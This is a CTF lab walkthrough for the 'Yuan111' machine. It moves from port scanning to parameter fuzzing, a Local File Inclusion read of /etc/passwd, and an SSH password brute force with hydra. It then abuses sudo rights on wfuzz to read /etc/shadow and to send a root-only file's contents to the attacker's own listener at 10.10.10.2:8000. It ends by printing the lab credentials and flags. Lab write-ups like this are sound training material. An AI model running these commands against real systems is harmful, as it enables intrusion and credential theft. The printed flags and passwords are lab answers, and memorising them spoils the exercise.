+++
title = "Yuan111 - Walkthrough"
author = "nvru"
date = "2026-07-09"
description = "Walkthrough for the Yuan111 machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "apache",
  "lfi",
  "ssh",
  "wfuzz",
  "sudo",
  "privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.19`

The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion (LFI) vulnerability, and escalate privileges by abusing a sudo misconfiguration allowing the execution of `wfuzz` as root.

![Machine information](/images/hmv/yuan111/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.19 -- -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp open  http    Apache httpd 2.4.62 (Debian)

HTTP Title:
Rockyou.txt - 密码字典文件介绍
```

Only SSH and an Apache web server were exposed, so web enumeration was the obvious next step.

---

## Enumeration

### Web Enumeration

Browsing the web application revealed a simple page describing the famous **rockyou.txt** password wordlist. There was nothing interesting in the page itself or within the HTML source code.

![Homepage](/images/hmv/yuan111/http.png)

---

### Directory Enumeration

Since the homepage did not reveal anything useful, I performed directory enumeration.

During the scan, I discovered `file.php`.

![Directory enumeration](/images/hmv/yuan111/dir_brute.png)

Accessing the file directly produced no output, suggesting it expected a parameter.

To identify the parameter name, I fuzzed common parameter names while attempting to read `/etc/passwd`.

```bash
ffuf -u "http://10.10.10.19/file.php?FUZZ=/etc/passwd" \
-w /opt/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0
```

The correct parameter was discovered to be:

```text
file
```

---

### Local File Inclusion (LFI)

Using the discovered parameter, I attempted to read `/etc/passwd`.

```text
http://10.10.10.19/file.php?file=/etc/passwd
```

The request successfully returned the contents of `/etc/passwd`, confirming a Local File Inclusion vulnerability.

![LFI](/images/hmv/yuan111/lfi_passwd.png)

From the output, only one regular user was present on the system:

```text
tao
```

---

## Initial Access

Since the website revolved around **rockyou.txt**, I attempted to brute-force the SSH service using a reduced version of the RockYou wordlist.

```bash
hydra -l tao -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.19 -v
```

The attack quickly succeeded.

```text
Username: tao
Password: rockyou
```

Logging in via SSH confirmed valid credentials.

![SSH Login](/images/hmv/yuan111/ssh_as_tao.png)

---

## Privilege Escalation

### tao → root

The first thing I checked was the user's sudo permissions.

```bash
sudo -l
```

![sudo permissions](/images/hmv/yuan111/sudo_l.png)

The user was allowed to execute the following binaries as any user, including root, without supplying a password:

```text
/usr/bin/wfuzz
/usr/bin/id
```

There were no interesting SUID binaries, Linux capabilities, or other obvious privilege escalation vectors.

While investigating the web application, I located the source code of `file.php`.

![file.php source](/images/hmv/yuan111/filephp_src.png)

The source code explained why the LFI only worked against `/etc/passwd`; additional filtering prevented access to other sensitive paths such as `/proc` or Tao's home directory.

Since `wfuzz` could be executed as root, I attempted to leverage it to access files that normally require elevated privileges.

One useful trick was using `/etc/shadow` as a wordlist.

![Shadow access](/images/hmv/yuan111/shadow.png)

Although this confirmed root-level file access, cracking the password was unsuccessful.

Instead of focusing on password cracking, I used `wfuzz`'s directory walking capabilities to enumerate files inside `/root`.

One of the commands used was:

```bash
sudo -u root /usr/bin/wfuzz -c \
-z file,/root/111.txt \
--hc 404 \
http://10.10.10.2:8000/FUZZ
```

The enumeration revealed the file containing the root password.


![Root password ](/images/hmv/yuan111/root_passwd.png)

![wfuzz enumeration](/images/hmv/yuan111/list_wfuzz.png)

Using the recovered password, I switched to the root account.

![Root shell](/images/hmv/yuan111/su_root.png)

---

## Credentials

```text
tao:rockyou

root:q6I42RCMyMkDV45svyuF
```

---

## Flags

```text
user:flag{user-21747e1ca09bfcc4f2551263db0f3dff}

root:flag{root-9bbd7af2a042a901b92dc203b3896621}
```
